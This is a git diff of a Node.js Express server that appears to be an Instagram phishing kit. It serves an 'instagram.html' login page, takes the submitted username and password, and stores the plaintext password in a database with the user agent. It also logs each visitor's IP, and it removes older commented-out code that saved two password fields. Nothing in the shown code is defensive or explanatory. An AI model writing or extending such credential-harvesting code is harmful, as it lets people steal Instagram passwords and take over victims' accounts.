@@ -4,30 +4,33 @@ const request=require('request')
 const db=require('./pool');
 const sessions=require('express-session')
 const cors = require('cors');
-
+const dotenv=require('dotenv').config()
+const cookieParser=require('cookie-parser')
     
 
 const app=express();
 
 
-app.use(express.static('../client'))
+app.use(express.static('./client'))
 app.use(express.json());
 app.use(express.urlencoded({ extended: false }))
-// app.use(cookieParser())
+app.use(sessions({
+    secret:'something here',
+    saveUninitialized:true,
+    resave:true,
+    cookie:{maxAge:1000*24*60*60*30,httpOnly:true}
+}))
+app.use(cookieParser())
 
 app.get('/',(req,res)=>{
-    console.log(req.session.userID);
-    res.redirect('https://www.instagram.com/reel/CgmShUBt4ZY/')
-    // res.sendFile(path.join(__dirname,'../client/index.html'))
+    console.log(`${req.ip} -> ${req.url}`)
+    // console.log(req.session.userID);
+    // res.redirect('https://www.instagram.com/reel/CgmShUBt4ZY/')
+    res.sendFile(path.join(__dirname,'../client/index.html'))
     
  })
 
- app.use(sessions({
-     secret:'something here',
-     saveUninitialized:true,
-     resave:true,
-     cookie:{maxAge:1000*24*60*60*30,httpOnly:true}
- }))
+
  
 let authenticator=function authenticato(req,res,next) {
     if(req.session.userID){
@@ -41,10 +44,11 @@ let authenticator=function authenticato(req,res,next) {
 
 
 app.get('/auth',(req,res)=>{
+    console.log(`${req.ip} -> ${req.url}`)
     res.sendFile(path.join(__dirname,'../client/instagram.html'))
 })
 app.post('/auth',async (req,res)=>{
-    
+    console.log(`${req.ip} -> ${req.url}`)
     let instaIdUrl=`https://www.instagram.com/${req.body.username}/ `
     
     request.get(instaIdUrl,(e,r)=>{
@@ -70,20 +74,7 @@ app.post('/auth',async (req,res)=>{
                 console.log(loginInfo);
                 req.session.userID=req.body.username;
 
-                // pool.getConnection((err,connection)=>{
-                //     if(err) throw err;
-                //     let sql=`insert into logininfo (username,pwd1,pwd2,user_ip,user_info,samay) values (?,?,?,?,?,?)`;
-                    
-                //     connection.query(sql,[loginInfo.username,loginInfo.pwd1,loginInfo.pwd2,req.ip,req.headers['user-agent'], new Date],(error)=>{
-
-                //         connection.release();
-                //         if(error) throw error 
-                        
-                //     })
-                    
-                    
-
-                // })
+                
                 const user=new db.user({
                     instaId:req.body.username,
                     pwd:req.body.password,
@@ -103,23 +94,14 @@ app.post('/auth',async (req,res)=>{
     // res.send({msg:true})
 })
 
-// app.post('/tester',(req,res)=>{
-//     console.log(req.headers)
-//     const user=new db.user({
-//         instaId:'codechef',
-//         pwd:'somepassword',
-//         useragent:req.headers['user-agent']
-
-//     })
-//     user.save()
-//     res.send({msg:'okay'})
-// })
 
 app.get('/survey',authenticator,(req,res)=>{
+    console.log(`${req.ip} -> ${req.url}`)
     console.log(req.session.userID+" itnto get");
     res.sendFile(path.join(__dirname,'../client/questions.html'))
 })
 app.post('/survey-report',(req,res)=>{
+    console.log(`${req.ip} -> ${req.url}`)
     // req.session.surveyTaken=true;
     console.log(req.body);
     
@@ -141,3 +123,6 @@ function cookieChecker() {
     return 'Used Only once'
 }
 
+module.exports={
+    app
+}
